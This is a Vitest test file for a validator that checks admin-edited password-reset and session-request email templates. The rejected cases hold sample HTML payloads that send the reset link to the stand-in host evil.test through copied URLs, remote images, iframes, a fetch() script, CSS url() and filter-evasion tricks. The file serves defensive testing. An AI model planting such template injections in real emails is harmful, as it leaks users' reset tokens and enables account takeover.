import { describe, expect, it } from 'vitest';
import { defaultConfig } from './runtime-config';
import { CREDENTIAL_TEMPLATE_LINKS, isSafeCredentialTemplate } from './credential-email-template';

const link = CREDENTIAL_TEMPLATE_LINKS.passwordReset;

describe('isSafeCredentialTemplate', () => {
	it.each(['passwordReset', 'temporarySessionRequest'] as const)(
		'accepts the default %s template',
		(key) => {
			expect(
				isSafeCredentialTemplate(
					defaultConfig.emailTemplates[key].html,
					CREDENTIAL_TEMPLATE_LINKS[key]
				)
			).toBe(true);
		}
	);

	it('accepts a reworded template that keeps the link', () => {
		expect(
			isSafeCredentialTemplate(`<div class="x"><h1>Hi</h1><a href="${link}">Reset</a></div>`, link)
		).toBe(true);
	});

	it.each([
		['as the text of its own link', `<a href="${link}">${link}</a>`],
		[
			'on a line of its own',
			`<p>Follow <a href="${link}">this link</a>, or open:</p><p>${link}</p>`
		],
		['after a colon and a space', `<p>Your link: <strong>${link}</strong></p>`]
	])('accepts a template that shows the link %s', (_, html) => {
		expect(isSafeCredentialTemplate(html, link)).toBe(true);
	});

	it.each([
		['the link is gone', '<p>Contact support</p>'],
		[
			'a plain-text URL is split from the link by an inline tag',
			`<a href="${link}">go</a> https://evil.test/?t=<b>${link}</b>`
		],
		['a remote image is loaded', `<a href="${link}">go</a><img src="https://evil.test/p.png">`],
		['the link is copied into another URL', `<a href="https://evil.test/?t=${link}">go</a>`],
		['the link is only shown as text next to another href', `<a href="//evil.test">${link}</a>`],
		['a frame is embedded', `<a href="${link}">go</a><iframe src="https://evil.test"></iframe>`],
		['a script is embedded', `<a href="${link}">go</a><script>fetch('//evil.test')</script>`],
		['a style can fetch a URL', `<a href="${link}" style="background:url(//evil.test)">go</a>`],
		['an event handler is set', `<a href="${link}" onclick="x()">go</a>`],
		['the tag is upper-cased', `<a href="${link}">go</a><IMG SRC="https://evil.test/p.png">`],
		['quotes are left out', `<a href=https://evil.test/${link}>go</a>`],
		['the link is copied into a plain-text URL', `Reset here: https://evil.test/?t=${link}`],
		[
			'a plain-text URL carries the link next to the real one',
			`<p>https://evil.test/?t=${link}</p><a href="${link}">go</a>`
		],
		['the placeholder is written in another case', `<a href="${link}">go</a> ${link.toUpperCase()}`]
	])('refuses a template where %s', (_, html) => {
		expect(isSafeCredentialTemplate(html, link)).toBe(false);
	});
});
